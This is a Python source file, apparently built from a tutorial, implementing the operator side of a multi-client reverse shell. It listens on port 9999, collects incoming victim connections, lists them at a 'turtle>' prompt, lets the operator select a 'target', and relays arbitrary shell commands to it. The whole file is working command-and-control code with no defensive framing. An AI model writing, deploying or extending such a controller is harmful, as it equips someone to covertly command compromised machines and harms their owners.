import socket
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
# on crée 2 listes ( IP addr la deuxieme addr)
all_connections = []
all_addresses = []


# create socket ( allow two computer to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket() # allow server to connect
    except socket.error as msg:
        print("socket creation error : " + str(msg))



# bind socket to port and wait for connection from client

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5) # nombre de connection accepte avant de refuser, pour listen le socket
    except socket.error as msg:
        print("Socket binding error : "+ str(msg) +"\n" + "Retrying...")
        time.sleep(5)
        socket_bind()


#Accept connections from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:] #clean toute la liste
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1) # pas de timeout
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established : " + address[0])
        except:
            print("Error accepting connections")

# interactive prompt to send command remotely
def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

# Displays all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' ')) # on verifie si on peut envoyer un message et recevoir une reponse
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'# quand on a une bonne connexion on l'ajoute et on met a la ligne
        print('----- Clients -----' + '\n' + results)


# select a target client
def get_target(cmd):
    try:
        # build connection
        target = cmd.replace('select ', '')
        target_num = int(target)
        conn = all_connections[target_num]
        print("yor are connected to " + str(all_addresses[target_num][0]))
        print(str(all_addresses[target_num][0]) + '> ', end='')
        return conn
    except Exception as e:
        print("not a valid selection "+str(e))
        return None


# connect with remote target
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == 'quit':
                break
        except Exception as e:
            print("connection lost"+str(e))
            break


# create threads
def create_workers():
    for i in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# do the next job in the queue ( one handle connect, other send command)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()


# each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    # block unti all tasks are done
    queue.join()


if __name__ == '__main__':
    # 2 threads to consume
    create_workers()
    # 1 thread to produce
    create_jobs()

